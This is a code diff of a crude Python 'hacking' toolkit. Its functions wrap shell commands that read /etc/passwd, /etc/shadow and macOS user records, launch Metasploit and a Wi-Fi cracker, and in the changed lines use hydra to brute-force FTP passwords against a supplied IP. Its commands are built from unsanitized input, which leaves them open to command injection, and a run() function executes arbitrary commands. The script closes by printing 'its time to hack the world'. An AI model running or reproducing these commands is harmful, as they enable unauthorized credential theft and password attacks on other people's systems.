@@ -6,7 +6,7 @@ def hackmac():
     os.system("cat /var/db/dslocal/nodes/Default/users")
 def hacklin():
     os.system("cat /etc/passwd")
-    os.system("sudo cat /etc/shadow")
+    os.system("cat /etc/shadow")
 def ddos(attack):
     os.system("ping "+ attack+"")
 def sqlinject():
@@ -16,16 +16,14 @@ def sqlinject():
 def exploit():
     clear()
     os.system("msfconsole")
-def python():
-    os.system("python3")
 def hackwifi():
     os.system("sudo apt install fern-wifi-cracker -y")
     clear()
     os.system("fern-wifi-cracker")
-def hackpasswd(email):
-    os.system("pip3 install h8mail")
+def hackpasswd(username, wordlist, ip):
+    os.system("sudo apt install hydra -y")
     clear()
-    os.system("h8mail -t "+ email+"")
+    os.system("hydra -l "+ username+" -P "+ wordlist+" ftp://"+ ip+"")
 def mitm():
     os.system("sudo apt instal wireshark -y")
     clear()
@@ -51,6 +49,4 @@ def install(package):
     clear()
 def run(command):
     os.system(command)
-def update():
-    os.system("sudo apt update && apt upgrade")
 print("its time to hack the world")
